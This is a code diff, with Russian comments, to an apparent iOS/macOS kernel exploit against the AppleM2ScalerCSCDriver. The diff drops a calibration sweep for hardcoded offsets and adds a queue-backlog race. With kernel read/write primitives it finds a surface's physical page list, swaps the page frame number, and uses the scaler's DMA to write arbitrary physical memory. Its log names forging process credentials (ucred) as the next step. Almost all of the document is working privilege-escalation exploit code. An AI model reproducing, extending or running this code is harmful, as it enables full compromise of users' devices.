@@ -5705,84 +5705,15 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     if (spix) memset(spix, 0x41, 0x1000);
     IOSurfaceUnlock(srcS, 0, NULL);
 
-    // 1.9.114 (раунд 15): DVA кэшируется при ПЕРВОМ wire поверхности — подмена
-    // должна стоять ДО первого submit настоящего dst. Поэтому калибровка TSD
-    // идёт на ВЫКИДНЫХ поверхностях (какой rect-оффсет даёт реальный DMA), а
-    // настоящий dst не сабмитится до подмены. kr=0 ≠ DMA: нулевые rect'ы →
-    // execute молча скипает — поэтому перебираем оффсеты {0,0,32,32}-пар.
+    // 1.9.124: конфиг уже откалиброван на железе дважды (1.9.116, nz=1024):
+    // rect {w=32,h=32} @ +0x0C/+0x10. Калибровочный свип убран — каждый
+    // M2-оп отравляет scheduler (zone-паники 172948/173443), чем меньше,
+    // тем дольше живём.
     uint8_t tsdGood[0x1B0];
     memset(tsdGood, 0, sizeof(tsdGood));
-    BOOL tsdOK = NO;
-    {
-        IOSurfaceRef calS = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
-        IOSurfaceRef calD = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
-        // 1.9.116: src был НУЛЕВЫМ — скейлер копировал нули в нули, nz=0 при
-        // ЛЮБОМ рабочем DMA. Заполняем паттерном 0x41, иначе калибровка слепа.
-        if (calS) {
-            IOSurfaceLock(calS, 0, NULL);
-            uint32_t *spx = (uint32_t *)IOSurfaceGetBaseAddress(calS);
-            if (spx) for (int i = 0; i < 1024; i++) spx[i] = 0x41414141;
-            IOSurfaceUnlock(calS, 0, NULL);
-        }
-        io_service_t svc0 = IOServiceGetMatchingService(kIOMasterPortDefault,
-                                                        IOServiceMatching("AppleM2ScalerCSCDriver"));
-        if (calS && calD && svc0) {
-            uint32_t calSrcID = IOSurfaceGetID(calS);
-            uint32_t calDstID = IOSurfaceGetID(calD);
-            io_connect_t conn0 = 0;
-            if (IOServiceOpen(svc0, mach_task_self(), 0, &conn0) == KERN_SUCCESS && conn0) {
-                // 1.9.115: три паттерна rect на каждый base (прошлый свип писал
-                // {x,y,w,h} — если layout {srcW,srcH,dstW,dstH}, ширина была 0
-                // → гарантированный скип). kr логируем: kr!=0 = валидация
-                // режет конфиг, kr=0 без DMA = валиден но не execute.
-                kern_return_t firstBadKr = 0;
-                BOOL badLogged = NO;
-                for (int pat = 0; pat < 3 && !tsdOK; pat++) {
-                    for (uint32_t base = 0x0C; base <= 0x44 && !tsdOK; base += 4) {
-                        uint8_t t[0x1B0];
-                        memset(t, 0, sizeof(t));
-                        *(uint32_t *)(t + 0) = calSrcID;
-                        *(uint32_t *)(t + 4) = calDstID;
-                        if (pat == 0) {              // {w,h} одна пара
-                            *(uint32_t *)(t + base) = 32;
-                            *(uint32_t *)(t + base + 4) = 32;
-                        } else if (pat == 1) {       // {x,y,w,h}
-                            *(uint32_t *)(t + base + 8) = 32;
-                            *(uint32_t *)(t + base + 12) = 32;
-                        } else {                     // {w,h} обе пары (src+dst rect)
-                            *(uint32_t *)(t + base) = 32;
-                            *(uint32_t *)(t + base + 4) = 32;
-                            *(uint32_t *)(t + base + 0x10) = 32;
-                            *(uint32_t *)(t + base + 0x14) = 32;
-                        }
-                        kern_return_t ckr = IOConnectCallMethod(conn0, 1, NULL, 0, t, sizeof(t), NULL, NULL, NULL, NULL);
-                        if (ckr != 0 && !badLogged) { firstBadKr = ckr; badLogged = YES; }
-                        usleep(60000);
-                        IOSurfaceLock(calD, 0, NULL);
-                        uint32_t *pxc = (uint32_t *)IOSurfaceGetBaseAddress(calD);
-                        int nz = 0;
-                        if (pxc) for (int i = 0; i < 1024; i++) if (pxc[i]) nz++;
-                        IOSurfaceUnlock(calD, 0, NULL);
-                        if (nz) {
-                            memcpy(tsdGood, t, sizeof(tsdGood));
-                            tsdOK = YES;
-                            kpNote(r, [NSString stringWithFormat:@"  TSD-калибровка: DMA ПОШЁЛ — паттерн %d, rect @ +%#x (kr=0x%x, nz=%d)", pat, base, ckr, nz]);
-                        }
-                    }
-                    if (!tsdOK)
-                        kpNote(r, [NSString stringWithFormat:@"  паттерн %d: DMA нигде (kr валидации: %#x)", pat, firstBadKr]);
-                }
-                // conn0 и cal-поверхности намеренно НЕ закрываем до конца
-                // теста — teardown M2 оставляет stale-записи в scheduler'е
-                // (наша же CVE-2026-43655 мина), не поджигаем сами себя.
-            }
-        }
-        if (!tsdOK)
-            kpNote(r, @"  TSD-калибровка: DMA не пошёл ни на одном оффсете rect — swap вслепую, шанс низкий");
-        if (calS) CFRelease(calS);
-        if (calD) CFRelease(calD);
-        if (svc0) IOObjectRelease(svc0);
-    }
+    BOOL tsdOK = YES;
+    *(uint32_t *)(tsdGood + 0x0C) = 32;
+    *(uint32_t *)(tsdGood + 0x10) = 32;
 
     // control page: marker-filled, we own it; get its PA through our own pmap
     uint8_t *ctl = valloc(0x4000);
@@ -5845,59 +5776,115 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                       ? kp_untag_ptr(kpSMRDecode(tb2)) : kp_untag_ptr(tb2);
         }
     }
-    uint64_t surfVA = 0, rangesVA = 0;
-    if (isTable) {
-        // 1.9.123: layout-агностический резолв. mach_port_names даёт ТОЧНЫЕ
-        // порты (индексы на этом девайсе уходят за 0x5xxx — слепой скан до
-        // 0x4000 их не доставал, прогон 1.9.120–122). По каждому kobject
-        // сканируем цепочку (P → [P+id*8] → surfVA → +0x178 → ranges →
-        // pfn==backingPA) — само-валидируется физикой, оффсеты не нужны.
-        mach_port_name_array_t names = NULL;
-        mach_msg_type_number_t namesCnt = 0;
-        mach_port_type_array_t types = NULL;
-        mach_msg_type_number_t typesCnt = 0;
-        int nKobj = 0, nChain = 0;
-        kern_return_t mkr = mach_port_names(mach_task_self(), &names, &namesCnt, &types, &typesCnt);
-        kpNote(r, [NSString stringWithFormat:@"  mach_port_names: kr=0x%x, портов=%u", mkr, namesCnt]);
-        if (mkr == KERN_SUCCESS) {
-            for (uint32_t i = 0; i < namesCnt && !rangesVA; i++) {
-                uint32_t idx = names[i] >> 8;
-                uint64_t eVA = isTable + (uint64_t)sizeof_ipc_entry * idx;
-                uint64_t oRaw = 0, kRaw = 0;
-                if (!kpRead(eVA + off_ipc_entry_ie_object, &oRaw, 8, "ps ie_obj", r) || !oRaw) continue;
-                uint64_t portVA = kp_untag_ptr(oRaw);
-                if (!kpLooksLikeKernelPointer(portVA)) continue;
-                if (!kpRead(portVA + off_ipc_port_ip_kobject, &kRaw, 8, "ps ip_kobj", r) || !kRaw) continue;
-                uint64_t ucVA = kp_untag_ptr(kRaw);
-                if (!kpLooksLikeKernelPointer(ucVA)) continue;
-                nKobj++;
-                for (uint32_t oo = 0; oo <= 0x140 && !rangesVA; oo += 8) {
-                    uint64_t P = 0;
-                    if (!kpRead(ucVA + oo, &P, 8, "ps P", r)) continue;
-                    P = kp_untag_ptr(P);
-                    if (!kpLooksLikeKernelPointer(P)) continue;
-                    uint64_t S = 0;
-                    if (!kpRead(P + (uint64_t)dstID * 8, &S, 8, "ps S", r)) continue;
-                    S = kp_untag_ptr(S);
-                    if (!kpLooksLikeKernelPointer(S)) continue;
-                    nChain++;
-                    uint64_t ro = 0, rq = 0;
-                    if (!kpRead(S + 0x178, &ro, 8, "ps ro", r)) continue;
-                    ro = kp_untag_ptr(ro);
-                    if (!kpLooksLikeKernelPointer(ro)) continue;
-                    if (!kpRead(ro + 0x18, &rq, 8, "ps rq", r)) continue;
-                    if ((uint32_t)(rq >> 32) != pfn32 || (uint32_t)rq != 1) continue;
-                    surfVA = S;
-                    rangesVA = ro + 0x18;
-                    kpNote(r, [NSString stringWithFormat:@"  ★ port %#x kobj+%#x: surfVA=%#llx rangeObj=%#llx rangesVA=%#llx (qword=%#018llx)",
-                              names[i], oo, (unsigned long long)surfVA, (unsigned long long)ro,
-                              (unsigned long long)rangesVA, (unsigned long long)rq]);
-                }
-            }
-            vm_deallocate(mach_task_self(), (vm_address_t)names, namesCnt * sizeof(mach_port_name_t));
-            vm_deallocate(mach_task_self(), (vm_address_t)types, typesCnt * sizeof(mach_port_type_t));
+    // 3. Trusted-path резолв surfVA через M2 async op-entry (1.9.124):
+    //    async submit резолвит surface ptr в op-entry БЕЗ execute/снапшота
+    //    (раунд 13: DVA-снапшот только при execute). Вся цепочка — из РЕАЛЬНЫХ
+    //    объектов (driver → scheduler → array → entry → surfVA → ranges):
+    //    никакого garbage-pointer роминга — zone-validator убивал ядро на
+    //    мусорных VA в примитиве (паники 172948/173443).
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                   IOServiceMatching("AppleM2ScalerCSCDriver"));
+    if (!svc) {
+        kpNote(r, @"  M2Scaler сервис не найден — SKIP");
+        free(ctl);
+        return r;
+    }
+    io_connect_t victim = IO_OBJECT_NULL, churn = IO_OBJECT_NULL;
+    kern_return_t vkr = IOServiceOpen(svc, mach_task_self(), 0, &victim);
+    kern_return_t ckr2 = IOServiceOpen(svc, mach_task_self(), 0, &churn);
+    if (vkr != KERN_SUCCESS || !victim || ckr2 != KERN_SUCCESS || !churn) {
+        kpNote(r, [NSString stringWithFormat:@"  open victim/churn: kr=0x%x/0x%x — SKIP", vkr, ckr2]);
+        IOObjectRelease(svc);
+        free(ctl);
+        return r;
+    }
+    // victim credit=0x10 — безопасный (кодировка struct+0 доказана A4b на железе)
+    {
+        uint8_t s10[0x18];
+        memset(s10, 0, sizeof(s10));
+        *(uint32_t *)s10 = 0x10;
+        uint64_t sc[3] = {0, 0, 0};
+        kern_return_t c10 = IOConnectCallMethod(victim, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+        kpNote(r, [NSString stringWithFormat:@"  victim credit=0x10: kr=0x%x", c10]);
+    }
+    // driver object → scheduler (layout-probe: поля РЕАЛЬНОГО driver-объекта)
+    uint64_t driverVA = kpM2TClientVA(r, isTable, svc, @"driver");
+    uint64_t schedVA = 0;
+    if (driverVA) {
+        uint64_t cand[64];
+        uint32_t candN = kpM2OCollectPtrs(driverVA, 0x800, cand, 64, r);
+        for (uint32_t i = 0; i < candN && !schedVA; i++) {
+            uint64_t cnt = 0, arr = 0, arr2 = 0;
+            if (!kpRead(cand[i] + 0xb8, &cnt, 8, "ps sch+b8", r)) continue;
+            if (!kpRead(cand[i] + 0xc8, &arr, 8, "ps sch+c8", r)) continue;
+            if (!kpRead(cand[i] + 0x110, &arr2, 8, "ps sch+110", r)) continue;
+            arr = kp_untag_ptr(arr);
+            arr2 = kp_untag_ptr(arr2);
+            if (cnt > 0x2000) continue;
+            if (!kpLooksLikeKernelPointer(arr) || !kpLooksLikeKernelPointer(arr2)) continue;
+            schedVA = cand[i];
         }
-        kpNote(r, [NSString stringWithFormat:@"  walk-счётчики: kobj=%d chain=%d", nKobj, nChain]);
+    }
+    kpNote(r, [NSString stringWithFormat:@"  driverVA=%#llx schedVA=%#llx", (unsigned long long)driverVA, (unsigned long long)schedVA]);
+    if (!schedVA) {
+        kpNote(r, @"  scheduler не найден — SKIP");
+        IOObjectRelease(svc);
+        free(ctl);
+        return r;
+    }
+    // backlog: churn держит workloop занятым ≈30-50мс (нулевой TSD — execute
+    // молча скипнет, нужна только занятость). Victim-оп встанет в хвост очереди.
+    uint8_t tsdZ[KP_M2_TSD_SIZE];
+    memset(tsdZ, 0, sizeof(tsdZ));
+    *(uint32_t *)(tsdZ + 0) = srcID;
+    *(uint32_t *)(tsdZ + 4) = dstID;
+    *(uint64_t *)(tsdZ + 8) = 1;   // async
+    for (int i = 0; i < 800; i++)
+        IOConnectCallMethod(churn, 1, NULL, 0, tsdZ, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
+    // victim async с ОТКАЛИБРОВАННЫМ TSD (при execute сделает DMA)
+    uint8_t tsdV[0x1B0];
+    memcpy(tsdV, tsdGood, sizeof(tsdV));
+    *(uint32_t *)(tsdV + 0) = srcID;
+    *(uint32_t *)(tsdV + 4) = dstID;
+    *(uint64_t *)(tsdV + 8) = 1;   // async — execute позже, окно для подмены
+    kern_return_t avkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
+    kpNote(r, [NSString stringWithFormat:@"  victim async submit (backlog=800): kr=0x%x", avkr]);
+    // entry с credit==0x10 в массиве scheduler'а
+    uint64_t eptrs[128];
+    uint32_t eN = kpM2OCollectEntries(schedVA, eptrs, 128, r);
+    uint64_t entryVA = 0;
+    for (uint32_t i = 0; i < eN; i++) {
+        if (kpM2OMarkerAt(eptrs[i], 0xc3c, 0x10, r)) { entryVA = eptrs[i]; break; }
+    }
+    kpNote(r, [NSString stringWithFormat:@"  entries=%u, victim entry=%#llx", eN, (unsigned long long)entryVA]);
+    // surfVA в записи: поля РЕАЛЬНОЙ записи, верификация ranges-цепочкой
+    uint64_t surfVA = 0, rangesVA = 0;
+    if (entryVA) {
+        for (uint32_t oo = 0; oo <= 0x80 && !rangesVA; oo += 8) {
+            uint64_t S = 0;
+            if (!kpRead(entryVA + oo, &S, 8, "ps S", r)) continue;
+            S = kp_untag_ptr(S);
+            if (!kpLooksLikeKernelPointer(S)) continue;
+            uint64_t ro = 0, rq = 0;
+            if (!kpRead(S + 0x178, &ro, 8, "ps ro", r)) continue;
+            ro = kp_untag_ptr(ro);
+            if (!kpLooksLikeKernelPointer(ro)) continue;
+            if (!kpRead(ro + 0x18, &rq, 8, "ps rq", r)) continue;
+            if ((uint32_t)(rq >> 32) != pfn32 || (uint32_t)rq != 1) continue;
+            surfVA = S;
+            rangesVA = ro + 0x18;
+            kpNote(r, [NSString stringWithFormat:@"  ★ entry+%#x: surfVA=%#llx rangeObj=%#llx rangesVA=%#llx (qword=%#018llx)",
+                      oo, (unsigned long long)surfVA, (unsigned long long)ro,
+                      (unsigned long long)rangesVA, (unsigned long long)rq]);
+        }
+    }
+    kpNote(r, [NSString stringWithFormat:@"  резолв: surfVA=%#llx rangesVA=%#llx",
+              (unsigned long long)surfVA, (unsigned long long)rangesVA]);
+    if (!rangesVA) {
+        kpNote(r, @"  surfVA/ranges через op-entry не резолвнулись — записей не будет");
+        IOObjectRelease(svc);
+        free(ctl);
+        return r;
     }
     kpNote(r, [NSString stringWithFormat:@"  резолв: isTable=%#llx surfVA=%#llx rangesVA=%#llx",
               (unsigned long long)isTable, (unsigned long long)surfVA, (unsigned long long)rangesVA]);
@@ -5907,16 +5894,13 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         return r;
     }
 
-    // 4. подмена ranges[0].pfn ДО первого execute поверхности (раунды 15–16:
-    //    снапшот DVA при первом execute; быстрый резолв = успеваем до wire).
-    //    lo32 (pagecount) сохраняем. Затем ОДИН submit с откалиброванным TSD.
-    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
-                                                   IOServiceMatching("AppleM2ScalerCSCDriver"));
+    // 4. подмена ranges[0].pfn — стоит ДО execute victim-опа (churn-backlog
+    //    держит workloop ≈30-50мс). Ждём execute, проверки, restore.
     uint64_t origQ = 0;
     kreadbuf(rangesVA, &origQ, 8);
     if ((uint32_t)(origQ >> 32) != pfn32) {
         kpNote(r, [NSString stringWithFormat:@"  ranges qword ушёл (%#018llx) — записи НЕ БУДЕТ", (unsigned long long)origQ]);
-        if (svc) IOObjectRelease(svc);
+        IOObjectRelease(svc);
         free(ctl);
         return r;
     }
@@ -5927,44 +5911,30 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     uint64_t rb = 0;
     kreadbuf(rangesVA, &rb, 8);
     kpNote(r, [NSString stringWithFormat:@"  readback = %#018llx %@", (unsigned long long)rb, rb == newQ ? @"— ПРИЛИПЛО" : @"— НЕ прилипло"]);
-    kpNote(r, @"  ПЕРВЫЙ submit dst (wire прочитает подмену)");
-    if (svc) {
-        io_connect_t conn = 0;
-        kern_return_t skr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
-        if (skr == KERN_SUCCESS && conn) {
-            uint8_t tsd[0x1B0];
-            memcpy(tsd, tsdGood, sizeof(tsd));   // откалиброванный конфиг
-            *(uint32_t *)(tsd + 0) = srcID;
-            *(uint32_t *)(tsd + 4) = dstID;
-            skr = IOConnectCallMethod(conn, 1, NULL, 0, tsd, sizeof(tsd), NULL, NULL, NULL, NULL);
-            kpNote(r, [NSString stringWithFormat:@"  scaler submit (sel 1, TSD %s): kr=0x%x (%s)",
-                      tsdOK ? "калиброван" : "нулевой", skr, mach_error_string(skr)]);
-            IOServiceClose(conn);
-        }
-    }
-    usleep(150000);   // DMA докручивается
+    kpNote(r, @"  жду execute victim-опа (backlog ~800 async)…");
+    usleep(400000);   // backlog drains → victim executes → DMA
     int changed = 0;
     for (uint32_t i = 0; i < 0x4000; i += 4) {
         uint32_t px = *(volatile uint32_t *)(ctl + i);
         if (px != 0xCCCCCCCC && px != 0) { changed++; if (changed <= 4) kpNote(r, [NSString stringWithFormat:@"    ctl+%#x: %#010x", i, px]); }
     }
-    // Куда реально ушёл DMA: пиксели dst после submit — ненулевые = записал в
+    // Куда реально ушёл DMA: пиксели dst после execute — ненулевые = записал в
     // оригинальный backing (DVA не последовал за подменой), пусто = не execute.
     IOSurfaceLock(dstS, 0, NULL);
     uint32_t *pxd = (uint32_t *)IOSurfaceGetBaseAddress(dstS);
     int nzd = 0;
     if (pxd) for (int i = 0; i < 1024; i++) if (pxd[i] && pxd[i] != 0x41544159) nzd++;
     IOSurfaceUnlock(dstS, 0, NULL);
-    kpNote(r, [NSString stringWithFormat:@"  dst пиксели после submit: ненулевых = %d — %@", nzd,
+    kpNote(r, [NSString stringWithFormat:@"  dst пиксели после execute: ненулевых = %d — %@", nzd,
               nzd ? @"DMA ушёл в ОРИГИНАЛЬНЫЙ backing (кэш DVA не последовал за подменой)" : @"в dst пусто"]);
     // restore ranges
     kwritebuf(rangesVA, &origQ, 8);
     if (changed) {
-        kpNote(r, [NSString stringWithFormat:@"=== PHYSWRITE DMA CONFIRMED: контрольная страница изменена DMA (%u dword) — подмена page-list ДО wire РАБОТАЕТ. Дальше цель = страница proc_ro.ucred ===", changed]);
+        kpNote(r, [NSString stringWithFormat:@"=== PHYSWRITE DMA CONFIRMED: контрольная страница изменена DMA (%u dword) — page-list swap до execute РАБОТАЕТ. Дальше форж ucred ===", changed]);
     } else {
-        kpNote(r, @"=== контрольная не изменилась (submit до wire, TSD, или DART отказал) — см. выше ===");
+        kpNote(r, @"=== контрольная не изменилась — см. выше ===");
     }
-    if (svc) IOObjectRelease(svc);
+    IOObjectRelease(svc);   // коннекшены НЕ закрываем (teardown = наша мина)
     free(ctl);
     return r;
 }
